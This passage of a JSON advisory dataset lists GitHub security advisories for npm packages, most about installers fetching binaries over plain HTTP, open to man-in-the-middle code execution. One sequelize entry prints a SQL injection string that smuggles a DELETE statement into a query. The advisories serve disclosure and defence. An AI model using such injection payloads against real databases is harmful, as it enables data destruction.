    "description": "sequelize is an Object-relational mapping, or a middleman to convert things from Postgres, MySQL, MariaDB, SQLite and Microsoft SQL Server into usable data for NodeJS. Before version 1.7.0-alpha3, sequelize defaulted SQLite to use MySQL backslash escaping, even though SQLite uses Postgres escaping.",
    "summary": "Moderate severity vulnerability that affects sequelize"
  },
  {
    "ghsaId": "GHSA-9c2p-jw8p-f84v",
    "publishedAt": "2019-02-18T23:54:24Z",
    "description": "sequelize is an Object-relational mapping, or a middleman to convert things from Postgres, MySQL, MariaDB, SQLite and Microsoft SQL Server into usable data for NodeJS In Postgres, SQLite, and Microsoft SQL Server there is an issue where arrays are treated as strings and improperly escaped. This causes potential SQL injection in sequelize 3.19.3 and earlier, where a malicious user could put `[\"test\", \"'); DELETE TestTable WHERE Id = 1 --')\"]` inside of ``` database.query('SELECT * FROM TestTable WHERE Name IN (:names)', { replacements: { names: directCopyOfUserInput } }); ``` and cause the SQL statement to become `SELECT Id FROM Table WHERE Name IN ('test', '\\'); DELETE TestTable WHERE Id = 1 --')`. In Postgres, MSSQL, and SQLite, the backslash has no special meaning. This causes the the statement to delete whichever Id has a value of 1 in the TestTable table.",
    "summary": "Moderate severity vulnerability that affects sequelize"
  },
  {
    "ghsaId": "GHSA-v5v3-8jqf-vg27",
    "publishedAt": "2019-02-18T23:54:22Z",
    "description": "aerospike is an Aerospike add-on module for Node.js. aerospike versions below 2.4.2 download binary resources over HTTP, which leaves the module vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects aerospike"
  },
  {
    "ghsaId": "GHSA-x5ph-4fr4-g7fw",
    "publishedAt": "2019-02-18T23:54:21Z",
    "description": "galenframework-cli is the node wrapper for the Galen Framework. galenframework-cli below 2.3.1 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects galenframework-cli"
  },
  {
    "ghsaId": "GHSA-jfgq-g48x-jq83",
    "publishedAt": "2019-02-18T23:54:20Z",
    "description": "iedriver is an NPM wrapper for Selenium IEDriver. iedriver versions below 3.0.0 download binary resources over HTTP, which leaves the module vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects iedriver"
  },
  {
    "ghsaId": "GHSA-g3xp-v2ff-x5c3",
    "publishedAt": "2019-02-18T23:54:18Z",
    "description": "During the installation process, the go-ipfs-deps module before 0.4.4 insecurely downloads resources over HTTP. This allows for a MITM attack to compromise the integrity of the resources used by this module and could allow for further compromise.",
    "summary": "Low severity vulnerability that affects go-ipfs-dep"
  },
  {
    "ghsaId": "GHSA-wq7q-7vfh-2x3h",
    "publishedAt": "2019-02-18T23:54:09Z",
    "description": "install-nw is a module which quickly and robustly installs and caches NW.js. install-nw versions below 1.1.5 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects install-nw"
  },
  {
    "ghsaId": "GHSA-ff29-f57w-2mm3",
    "publishedAt": "2019-02-18T23:54:03Z",
    "description": "geoip-lite-country is a stripped down version of geoip-lite, supporting only country lookup. geoip-lite-country before 1.1.4 downloads data resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "Low severity vulnerability that affects geoip-lite-country"
  },
  {
    "ghsaId": "GHSA-g93h-75m9-3qq4",
    "publishedAt": "2019-02-18T23:52:27Z",
    "description": "pngcrush-installer is an installer for Pngcrush. pngcrush-installer versions below 1.8.10 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects pngcrush-installer"
  },
  {
    "ghsaId": "GHSA-4wm5-q7wv-6jx3",
    "publishedAt": "2019-02-18T23:52:20Z",
    "description": "bkjs-wand is imagemagick wand support for node.js and backendjs bkjs-wand versions lower than 0.3.2 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects bkjs-wand"
  },
  {
    "ghsaId": "GHSA-7r8m-45gc-m2c8",
    "publishedAt": "2019-02-18T23:52:14Z",
    "description": "mongodb-instance before 0.0.3 installs mongodb locally. mongodb-instance downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects mongodb-instance"
  },
  {
    "ghsaId": "GHSA-3627-w2qr-5fxr",
    "publishedAt": "2019-02-18T23:52:07Z",
    "description": "Fuseki server wrapper and management API in fuseki before 1.0.1 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects fuseki"
  },
  {
    "ghsaId": "GHSA-c4qp-h3m6-785f",
    "publishedAt": "2019-02-18T23:51:59Z",
    "description": "ibm_db is an asynchronous/synchronous interface for node.js to IBM DB2 and IBM Informix. ibm_db before 1.0.2 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects ibm_db"
  },
  {
    "ghsaId": "GHSA-qjf4-7642-c57p",
    "publishedAt": "2019-02-18T23:51:52Z",
    "description": "unicode loads unicode data downloaded from unicode.org into nodejs. Unicode before 9.0.0 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects unicode"
  },
  {
    "ghsaId": "GHSA-gc6c-5v9w-xmhw",
    "publishedAt": "2019-02-18T23:51:27Z",
    "description": "nodewebkit is an installer for node-webkit. nodewebkit downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested zip file with an attacker controlled zip file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects nodewebkit"
  },
  {
    "ghsaId": "GHSA-hjgp-8ffr-hwwr",
    "publishedAt": "2019-02-18T23:51:19Z",
    "description": "closurecompiler is a Closure Compiler for node.js. closurecompiler downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects closurecompiler"
  },
  {
    "ghsaId": "GHSA-8mrf-g42m-5qc8",
    "publishedAt": "2019-02-18T23:51:14Z",
    "description": "dalek-browser-chrome-canary provides Google Chrome bindings for DalekJS. dalek-browser-chrome-canary downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "Low severity vulnerability that affects dalek-browser-chrome-canary"
  },
  {
    "ghsaId": "GHSA-769c-qphh-g3wm",
    "publishedAt": "2019-02-18T23:51:09Z",
    "description": "macaca-chromedriver is a Node.js wrapper for the selenium chromedriver. macaca-chromedriver before 1.0.29 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects macaca-chromedriver"
  },
  {
    "ghsaId": "GHSA-hv96-xxx2-5v7w",
    "publishedAt": "2019-02-18T23:51:04Z",
    "description": "nw is an installer for nw.js. nw downloads zipped resources over HTTP, It may be possible to cause remote code execution (RCE) by swapping out the requested zip file with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects nw"
  },
  {
    "ghsaId": "GHSA-p2hm-8725-c8x8",
    "publishedAt": "2019-02-18T23:50:58Z",
    "description": "cue-sdk-node is a Corsair Cue SDK wrapper for node.js. cue-sdk-node downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested zip file with an attacker controlled zip file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects cue-sdk-node"
  },
  {
    "ghsaId": "GHSA-5w4p-h4gm-3w26",
    "publishedAt": "2019-02-18T23:50:53Z",
    "description": "jser-stat is a JSer.info stat library. jser-stat downloads data resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "Moderate severity vulnerability that affects jser-stat"
  },
  {
    "ghsaId": "GHSA-9gqh-q4cx-f2h9",
    "publishedAt": "2019-02-18T23:50:41Z",
    "description": "ipip is a Node.js module to query geolocation information for an IP or domain, based on database by ipip.net. ipip downloads data resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects ipip"
  },
  {
    "ghsaId": "GHSA-mm7h-323r-9p4g",
    "publishedAt": "2019-02-18T23:50:33Z",
    "description": "imageoptim is a Node.js wrapper for some images compression algorithms. imageoptim downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested tarball with an attacker controlled tarball if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects imageoptim"
  },
  {
    "ghsaId": "GHSA-238x-q7xf-p4xw",
    "publishedAt": "2019-02-18T23:50:32Z",
    "description": "arrayfire-js is a module for ArrayFire for the Node.js platform. arrayfire-js downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects arrayfire-js"
  },
  {
    "ghsaId": "GHSA-7xvg-m3vx-2hhv",
    "publishedAt": "2019-02-18T23:50:26Z",
    "description": "webrtc-native uses WebRTC from chromium project. webrtc-native downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects webrtc-native"
  },
  {
    "ghsaId": "GHSA-g785-775g-f2g8",
    "publishedAt": "2019-02-18T23:50:21Z",
    "description": "haxe is a cross-platform toolkit haxe downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested zip file with an attacker controlled zip file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects haxe"
  },
  {
    "ghsaId": "GHSA-6q8q-rvf4-m4pg",
    "publishedAt": "2019-02-18T23:50:14Z",
    "description": "dalek-browser-chrome is Google Chrome bindings for DalekJS. dalek-browser-chrome downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects dalek-browser-chrome"
  },
  {
    "ghsaId": "GHSA-65q2-x652-xx84",
    "publishedAt": "2019-02-18T23:50:04Z",
    "description": "dalek-browser-ie is Internet Explorer bindings for DalekJS. dalek-browser-ie downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects dalek-browser-ie"
  },
  {
    "ghsaId": "GHSA-4q79-fch7-g78q",
    "publishedAt": "2019-02-18T23:48:11Z",
    "description": "grunt-webdriver-qunit is a grunt plugin to run qunit with webdriver in grunt grunt-webdriver-qunit downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects grunt-webdriver-qunit"
  },
  {
    "ghsaId": "GHSA-6v7p-j23v-4xmw",
    "publishedAt": "2019-02-18T23:48:03Z",
    "description": "robot-js is a module for native system automation for node.js. robot-js downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects robot-js"
  },
  {
    "ghsaId": "GHSA-hw4r-xr38-hm8j",
    "publishedAt": "2019-02-18T23:47:59Z",
    "description": "unicode-json is a unicode lookup table. unicode-json before 2.0.0 downloads data resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects unicode-json"
  },
  {
    "ghsaId": "GHSA-8gf4-pcj6-54rp",
    "publishedAt": "2019-02-18T23:47:53Z",
    "description": "strider-sauce is Sauce Labs / Selenium support for Strider. strider-sauce downloads zipped resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested zip file with an attacker controlled zip file if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects strider-sauce"
  },
  {
    "ghsaId": "GHSA-x56r-5r34-qg74",
    "publishedAt": "2019-02-18T23:47:47Z",
    "description": "dalek-browser-ie-canary is Internet Explorer bindings for DalekJS. dalek-browser-ie-canary downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects dalek-browser-ie-canary"
  },
  {
    "ghsaId": "GHSA-4x5j-v9v9-w8gw",
    "publishedAt": "2019-02-18T23:47:40Z",
    "description": "httpsync is a port of libcurl to node.js. httpsync downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects httpsync"
  },
  {
    "ghsaId": "GHSA-mgr2-3mpv-43gc",
    "publishedAt": "2019-02-18T23:47:37Z",
    "description": "openframe-image is an Openframe extension which adds support for images via fbi. openframe-image downloads data resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects openframe-image"
  },
  {
    "ghsaId": "GHSA-r74q-wqx8-2pr3",
    "publishedAt": "2019-02-18T23:47:31Z",
    "description": "nodeschnaps is a NodeJS compatibility layer for Java (Rhino). nodeschnaps downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects nodeschnaps"
  },
  {
    "ghsaId": "GHSA-7p6h-3fmw-539q",
    "publishedAt": "2019-02-18T23:47:27Z",
    "description": "selenium-chromedriver is a simple utility for downloading the Selenium Webdriver for Google Chrome selenium-chromedriver downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects selenium-chromedriver"
  },
  {
    "ghsaId": "GHSA-747p-jfqv-f43r",
    "publishedAt": "2019-02-18T23:47:26Z",
    "description": "mystem3 is a NodeJS wrapper for the Yandex MyStem 3. mystem3 downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects mystem3"
  },
  {
    "ghsaId": "GHSA-pr34-8jfr-xhv8",
    "publishedAt": "2019-02-18T23:47:21Z",
    "description": "selenium-wrapper is a selenium server wrapper, including installation and chrome webdriver. selenium-wrapper downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects selenium-wrapper"
  },
  {
    "ghsaId": "GHSA-qjvf-rmwg-64fr",
    "publishedAt": "2019-02-18T23:47:20Z",
    "description": "install-g-test downloads resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects install-g-test"
  },
  {
    "ghsaId": "GHSA-cvx3-pqmj-x57x",
    "publishedAt": "2019-02-18T23:47:13Z",
    "description": "scala-standalone-bin is a Binary wrapper for ScalaJS. scala-standalone-bin downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects scalajs-standalone-bin"
  },
  {
    "ghsaId": "GHSA-cmj2-m9m2-6726",
    "publishedAt": "2019-02-18T23:47:11Z",
    "description": "grunt-ccompiler is a Closure Compiler Grunt Plugin. grunt-ccompiler downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects grunt-ccompiler"
  },
  {
    "ghsaId": "GHSA-cwp7-92h5-82wx",
    "publishedAt": "2019-02-18T23:47:10Z",
    "description": "haxe-dev is a cross-platform toolkit. haxe-dev downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects haxe-dev"
  },
  {
    "ghsaId": "GHSA-rqwh-c535-j9hw",
    "publishedAt": "2019-02-18T23:47:09Z",
    "description": "js-given is a JavaScript frontend to jgiven. js-given downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects js-given"
  },
  {
    "ghsaId": "GHSA-j3cr-j9jx-mf4p",
    "publishedAt": "2019-02-18T23:47:07Z",
    "description": "redis-srvr is a npm wrapper for redis-server. redis-srvr downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects redis-srvr"
  },
  {
    "ghsaId": "GHSA-m2w9-rm58-mhm9",
    "publishedAt": "2019-02-18T23:47:06Z",
    "description": "node-thulac is a node binding for thulac. node-thulac downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects node-thulac"
  },
  {
    "ghsaId": "GHSA-476p-r2wx-2wch",
    "publishedAt": "2019-02-18T23:47:05Z",
    "description": "ntfserver is a Network Testing Framework Server. ntfserver downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects ntfserver"
  },
  {
    "ghsaId": "GHSA-2vqv-hp3p-fmv8",
    "publishedAt": "2019-02-18T23:47:03Z",
    "description": "webdriver-launcher is a Node.js Selenium Webdriver Launcher. webdriver-launcher downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects webdriver-launcher"
  },
  {
    "ghsaId": "GHSA-r36x-p5pv-9mfx",
    "publishedAt": "2019-02-18T23:45:25Z",
    "description": "prebuild-lwip is a module for comprehensive, fast, and simple image processing and manipulation. prebuild-lwip downloads resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects prebuild-lwip"
  },
  {
    "ghsaId": "GHSA-j7j5-752x-wr4v",
    "publishedAt": "2019-02-18T23:45:21Z",
    "description": "xd-testing is a testing library for cross-device (XD) web applications. xd-testing downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects xd-testing"
  },
  {
    "ghsaId": "GHSA-5q5w-mf87-57x4",
    "publishedAt": "2019-02-18T23:45:18Z",
    "description": "sfml downloads resources over HTTP, which leaves it vulnerable to MITM attacks.",
    "summary": "High severity vulnerability that affects sfml"
  },
  {
    "ghsaId": "GHSA-59m2-j944-839w",
    "publishedAt": "2019-02-18T23:45:13Z",
    "description": "The clang-extra module installs LLVM's clang-extra tools. clang-extra downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects clang-extra"
  },
  {
    "ghsaId": "GHSA-qhm8-m2c4-9mw7",
    "publishedAt": "2019-02-18T23:45:11Z",
    "description": "qbs is a build tool that helps simplify the build process for developing projects across multiple platforms. qbs downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects qbs"
  },
  {
    "ghsaId": "GHSA-5rm3-qhxf-rh3r",
    "publishedAt": "2019-02-18T23:45:10Z",
    "description": "co-cli-installer downloads the co-cli module as part of the install process, but does so over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects co-cli-installer"
  },
  {
    "ghsaId": "GHSA-mpww-j7xj-cj35",
    "publishedAt": "2019-02-18T23:45:07Z",
    "description": "native-opencv is the OpenCV library installed via npm native-opencv downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects native-opencv"
  },
  {
    "ghsaId": "GHSA-5pq8-2q24-mj3p",
    "publishedAt": "2019-02-18T23:45:03Z",
    "description": "fis-parser-sass-bin a plugin for fis to compile sass using node-sass-binaries. fis-parser-sass-bin downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects fis-parser-sass-bin"
  },
  {
    "ghsaId": "GHSA-w364-8vfv-gvf5",
    "publishedAt": "2019-02-18T23:44:52Z",
    "description": "phantomjs-cheniu is a Headless WebKit with JS API phantomjs-cheniu downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects phantomjs-cheniu"
  },
  {
    "ghsaId": "GHSA-g84j-95x2-7g67",
    "publishedAt": "2019-02-18T23:44:50Z",
    "description": "tomita is a node wrapper for Yandex Tomita Parser tomita downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects tomita"
  },
  {
    "ghsaId": "GHSA-cr8h-x88h-jwj2",
    "publishedAt": "2019-02-18T23:44:45Z",
    "description": "wixtoolset is a Node module wrapper around the wixtoolset binaries wixtoolset downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects wixtoolset"
  },
  {
    "ghsaId": "GHSA-wx3q-6x7x-jjw4",
    "publishedAt": "2019-02-18T23:44:39Z",
    "description": "mystem is a Node.js wrapper for MyStem morphology text analyzer by Yandex.ru mystem downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested binary with an attacker controlled binary if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects mystem"
  },
  {
    "ghsaId": "GHSA-7r2x-3qcm-8vfw",
    "publishedAt": "2019-02-18T23:44:36Z",
    "description": "herbivore is a packet sniffing and crafting library. Built on libtins herbivore 0.0.3 and below download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects herbivore"
  },
  {
    "ghsaId": "GHSA-6fvw-7vch-x489",
    "publishedAt": "2019-02-18T23:44:36Z",
    "description": "selenium-portal is a Selenium Testing Framework selenium-portal downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects selenium-portal"
  },
  {
    "ghsaId": "GHSA-432j-4fw9-2g6f",
    "publishedAt": "2019-02-18T23:44:33Z",
    "description": "libsbml is a module that installs Linux binaries for libSBML libsbml downloads resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects libsbml"
  },
  {
    "ghsaId": "GHSA-p9pm-55vp-2jqw",
    "publishedAt": "2019-02-18T23:44:32Z",
    "description": "soci downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects soci"
  },
  {
    "ghsaId": "GHSA-455m-q3h9-34pf",
    "publishedAt": "2019-02-18T23:44:29Z",
    "description": "windows-seleniumjar-mirror downloads the Selenium Jar file windows-seleniumjar-mirror downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects windows-seleniumjar-mirror"
  },
  {
    "ghsaId": "GHSA-wg5r-c793-w5w2",
    "publishedAt": "2019-02-18T23:44:28Z",
    "description": "mystem-wrapper is a Yandex mystem app wrapper module. mystem-wrapper downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects mystem-wrapper"
  },
  {
    "ghsaId": "GHSA-gf8v-vxf9-7c66",
    "publishedAt": "2019-02-18T23:44:26Z",
    "description": "cloudpub-redis is a module for CloudPub: Redis Backend cloudpub-redis downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects cloudpub-redis"
  },
  {
    "ghsaId": "GHSA-m8pw-h8qj-rgj9",
    "publishedAt": "2019-02-18T23:44:24Z",
    "description": "ipip-coffee queries geolocation information from IP ipip-coffee downloads geolocation resources over HTTP, which leaves it vulnerable to MITM attacks. This could impact the integrity and availability of the data being used to make geolocation decisions by an application.",
    "summary": "Moderate severity vulnerability that affects ipip-coffee"
  },
  {
    "ghsaId": "GHSA-rj38-87f3-93p6",
    "publishedAt": "2019-02-18T23:42:27Z",
    "description": "limbus-buildgen is a \"build anywhere\" build system. limbus-buildgen versions below 0.1.1 download binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects limbus-buildgen"
  },
  {
    "ghsaId": "GHSA-x268-6jhm-2mx8",
    "publishedAt": "2019-02-18T23:42:22Z",
    "description": "libsbmlsim is a module that installs linux binaries for libsbmlsim libsbmlsim downloads binary resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects libsbmlsim"
  },
  {
    "ghsaId": "GHSA-3w76-x94r-pw44",
    "publishedAt": "2019-02-18T23:42:16Z",
    "description": "rs-brightcove is a wrapper around brightcove's web api rs-brightcove downloads source file resources over HTTP, which leaves it vulnerable to MITM attacks. It may be possible to cause remote code execution (RCE) by swapping out the requested resources with an attacker controlled copy if the attacker is on the network or positioned in between the user and the remote server.",
    "summary": "High severity vulnerability that affects rs-brightcove"
  },
  {
    "ghsaId": "GHSA-69r7-cw26-px6h",
    "publishedAt": "2019-02-18T23:42:14Z",
